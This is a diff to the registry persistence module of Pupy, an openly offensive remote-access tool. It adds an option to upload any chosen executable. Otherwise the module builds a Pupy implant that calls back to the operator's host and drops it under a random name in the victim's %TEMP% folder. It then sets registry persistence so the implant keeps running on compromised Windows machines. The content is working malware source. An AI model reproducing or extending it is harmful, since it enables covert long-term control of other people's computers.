@@ -11,6 +11,7 @@ class PersistenceModule(PupyModule):
 	""" Enables persistence via registry keys """
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
+		self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency')
 		self.arg_parser.add_argument('-m','--method', choices=['registry'], required=True, help='persistence method')
 
 	@windows_only
@@ -18,19 +19,25 @@ class PersistenceModule(PupyModule):
 		pass
 
 	def run(self, args):
-		if args.method=="registry":
-			self.client.load_package("pupwinutils.persistence")
-
+		exebuff=b""
+		if args.exe:
+			with open(args.exe,'rb') as f:
+				exebuff=f.read()
+			self.info("loading %s ..."%args.exe)
+		else:
 			#retrieving conn info
 			res=self.client.conn.modules['pupy'].get_connect_back_host()
 			host, port=res.rsplit(':',1)
-
-			self.info("generating exe ...")
 			#generating exe
+			self.info("generating exe ...")
 			if self.client.desc['proc_arch']=="64bit":
 				exebuff=pupygen.get_edit_pupyx64_exe(host, port)
 			else:
 				exebuff=pupygen.get_edit_pupyx86_exe(host, port)
+		if args.method=="registry":
+			self.client.load_package("pupwinutils.persistence")
+
+
 
 			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
 			self.info("uploading to %s ..."%remote_path)
@@ -54,5 +61,5 @@ class PersistenceModule(PupyModule):
 
 			self.success("persistence added !")
 		else:
-			self.error("not implemented")
+			self.error("method not implemented")
 
